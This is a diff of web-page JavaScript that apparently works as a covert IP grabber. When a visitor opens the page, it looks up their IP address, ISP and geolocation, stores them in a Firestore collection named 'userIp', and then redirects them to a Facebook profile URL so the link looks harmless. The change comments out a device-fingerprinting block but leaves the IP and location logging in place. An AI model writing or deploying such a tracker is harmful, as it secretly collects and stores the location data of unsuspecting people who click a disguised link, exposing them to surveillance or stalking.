@@ -16,21 +16,20 @@ fetch('https://api.ipify.org/?format=json')
             isp: data.isp,
         }
 
-        try{
-          const deviceInfo = {
-    userAgent: navigator.userAgent,
-    language: navigator.language,
-    platform: navigator.platform,
-    screenWidth: window.screen.width,
-    screenHeight: window.screen.height,
-    networkeffectiveType: navigator.connection ? navigator.connection.effectiveType : undefined,
-    networkdownlink: navigator.connection ? navigator.connection.downlink : undefined,
-};
+//         const deviceInfo = {
+//     userAgent: navigator.userAgent,
+//     language: navigator.language,
+//     platform: navigator.platform,
+//     screenWidth: window.screen.width,
+//     screenHeight: window.screen.height,
+//     networkeffectiveType: navigator.connection ? navigator.connection.effectiveType : undefined,
+//     networkdownlink: navigator.connection ? navigator.connection.downlink : undefined,
+// };
 
-console.log(deviceInfo);
+// console.log(deviceInfo);
 
         db.collection("userIp").add({
-            ipAddress, time: new Date(), geoBasicInfo, deviceInfo,
+            ipAddress, time: new Date(), geoBasicInfo,
 //             ipAddress, deviceInfo, geoBasicInfo, time: new Date(),
         }).then(_ => {
             window.location.replace("http://www.facebook.com/profile.php?")
@@ -39,14 +38,6 @@ console.log(deviceInfo);
       .catch(error => {
         console.error(error);
       });
-        }catch{
-          db.collection("userIp").add({
-            ipAddress, time: new Date(), geoBasicInfo, deviceInfo,
-//             ipAddress, deviceInfo, geoBasicInfo, time: new Date(),
-        }).then(_ => {
-            window.location.replace("http://www.facebook.com/profile.php?")
-        });
-        }
 
 
 
